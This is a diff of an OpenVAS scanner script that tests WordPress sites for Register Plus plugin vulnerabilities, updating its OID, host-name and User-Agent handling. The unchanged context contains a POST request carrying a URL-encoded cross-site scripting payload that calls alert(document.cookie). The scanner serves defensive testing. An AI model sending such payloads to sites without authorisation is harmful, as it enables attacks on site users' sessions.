@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_wordpress_register_plus_mult_vuln.nasl 5388 2017-02-21 15:13:30Z teissa $
+# $Id: gb_wordpress_register_plus_mult_vuln.nasl 5838 2017-04-03 10:26:36Z cfi $
 #
 # WordPress Register Plus Plugin Multiple Vulnerabilities
 #
@@ -48,14 +48,13 @@ features, remove the product or replace the product by another one.";
 tag_summary = "The host is running WordPress Register Plus Plugin and is prone
   to multiple vulnerabilities.";
 
-SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.801492";
 CPE = "cpe:/a:wordpress:wordpress";
 
 if(description)
 {
-  script_oid(SCRIPT_OID);
-  script_version("$Revision: 5388 $");
-  script_tag(name:"last_modification", value:"$Date: 2017-02-21 16:13:30 +0100 (Tue, 21 Feb 2017) $");
+  script_oid("1.3.6.1.4.1.25623.1.0.801492");
+  script_version("$Revision: 5838 $");
+  script_tag(name:"last_modification", value:"$Date: 2017-04-03 12:26:36 +0200 (Mon, 03 Apr 2017) $");
   script_tag(name:"creation_date", value:"2010-12-27 09:55:05 +0100 (Mon, 27 Dec 2010)");
   script_bugtraq_id(45057);
   script_cve_id("CVE-2010-4402", "CVE-2010-4403");
@@ -83,22 +82,19 @@ if(description)
   exit(0);
 }
 
-
 include("http_func.inc");
 include("version_func.inc");
 include("http_keepalive.inc");
 include("host_details.inc");
 
-
-## Get HTTP Port
-if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);
-if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);
+if(!port = get_app_port(cpe:CPE))exit(0);
+if(!dir = get_app_location(cpe:CPE, port:port))exit(0);
 
 if(dir != NULL)
 {
   ## Try an exploit
   filename = string(dir + "/wp-login.php?action=register");
-  host = get_host_name();
+  host = http_host_name( port:port );
   authVariables = "user_login=abc&user_email=abc%40gmail&firstname=&lastname=" +
                   "&website=&aim=&yahoo=&jabber=&about=&pass1=%22%3E%3Cscript" +
                   "%3Ealert%28document.cookie%29%3C%2Fscript%3E&pass2=%22%3E%" +
@@ -107,7 +103,7 @@ if(dir != NULL)
   ## Construct post request
   sndReq2 = string("POST ", filename, " HTTP/1.1\r\n",
                    "Host: ", host, "\r\n",
-                   "User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8\r\n",
+                   "User-Agent: ", OPENVAS_HTTP_USER_AGENT, "\r\n",
                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
                    "Accept-Language: en-us,en;q=0.5\r\n",
                    "Accept-Encoding: gzip,deflate\r\n",
